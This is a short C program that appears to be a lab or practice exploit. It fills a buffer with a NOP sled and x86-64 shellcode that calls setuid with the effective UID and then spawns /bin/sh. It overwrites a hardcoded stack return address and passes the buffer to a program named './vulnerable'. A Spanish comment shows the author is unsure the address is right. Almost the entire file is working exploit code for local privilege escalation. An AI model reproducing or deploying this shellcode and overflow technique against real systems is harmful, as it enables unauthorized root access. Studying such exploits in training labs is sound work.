#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>



int main(int argc, char *argv[]) {
    char buffer[80]; 
    long *ret;
    long shellcode_addr;

    unsigned char shellcode [] =
    "\x48\x31\xff"              // xor rdi, rdi
    "\xb8\x69\x00\x00\x00"      // mov eax,0x69 (geteuid)
    "\x0f\x05"                  // syscall
    "\x48\x89\xc7"              // mov rdi,rax
    "\xb8\x6e\x00\x00\x00"      // mov eax,0x6e (setuid)
    "\x0f\x05"                  // syscall
    "\x48\x31\xc0"
    "\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    "\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";

    memset(buffer, 0x90, sizeof(buffer)); 
    memcpy(buffer + 80 - sizeof(shellcode), shellcode, sizeof(shellcode)); 

    shellcode_addr = (long)buffer;
    
    ret = (long *)(buffer + 64 +8); 
    *ret = (long)0x7fffffffe140; //esto no lo encuentro bien

    char *args[] = { "./vulnerable", buffer, NULL };
    char *env[] = { NULL };
    
    execve(args[0], args, env);

    return 0;
}
